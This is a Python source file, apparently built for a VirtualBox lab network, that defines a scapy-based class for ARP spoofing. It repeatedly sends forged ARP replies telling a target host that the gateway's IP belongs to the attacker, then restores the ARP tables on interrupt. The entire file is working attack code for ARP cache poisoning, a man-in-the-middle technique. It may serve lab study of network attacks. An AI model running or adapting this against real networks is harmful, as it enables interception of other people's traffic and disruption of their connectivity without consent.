import scapy.all as scapy
from scapy.all import get_if_hwaddr
import time

class SofiaArpSpoofAttack:
	def __init__(self, append_log) -> None:
		self.append_log = append_log
		self.g_target_ip = "192.168.56.101" # Enter your target IP
		self.g_gateway_ip = "192.168.56.1" # Enter your gateway's IP
		self.iface = "vboxnet0"

	def get_mac(self, ip):

		if ip == self.g_gateway_ip:
			return get_if_hwaddr("vboxnet0")

		arp_request = scapy.ARP(pdst = ip)
		broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast / arp_request
		try:
			answered_list = scapy.srp(arp_request_broadcast, iface=self.iface, timeout = 5)[0]
		except Exception as e:
			self.append_log(f"Failed with error: {e}")
			return False

		# Check if there is a response
		if not answered_list.res:
			return False

		mac = answered_list[0][1].hwsrc
		self.append_log(f"Got MAC address of IP: {ip} is {mac}")
		return mac

	def spoof(self):
		mac = self.get_mac(self.g_target_ip)
		if not mac:
			self.append_log(f"Cannot get MAC address of IP: {self.g_target_ip}")
			return False

		packet = scapy.ARP(op=2, pdst=self.g_target_ip, hwdst=mac, psrc=self.g_gateway_ip)
		scapy.send(packet, verbose=False)
		return True

	def restore(self, destination_ip, source_ip):
		destination_mac = self.get_mac(destination_ip)
		source_mac = self.get_mac(source_ip)
		packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
		scapy.send(packet, verbose = False)

	def run(self):
		try:
			sent_packets_count = 0
			while True:
				if not self.spoof() or not self.spoof():
					self.append_log("Stopping the Attack ..")
					break
				sent_packets_count = sent_packets_count + 2
				self.append_log("\r[*] Packets Sent "+str(sent_packets_count))
				time.sleep(2) # Waits for two seconds

		except KeyboardInterrupt:
			self.append_log("\nCtrl + C pressed.............Exiting")
			self.restore(self.g_gateway_ip, self.g_target_ip)
			self.restore(self.g_target_ip, self.g_gateway_ip)
			self.append_log("[+] Arp Spoof Stopped")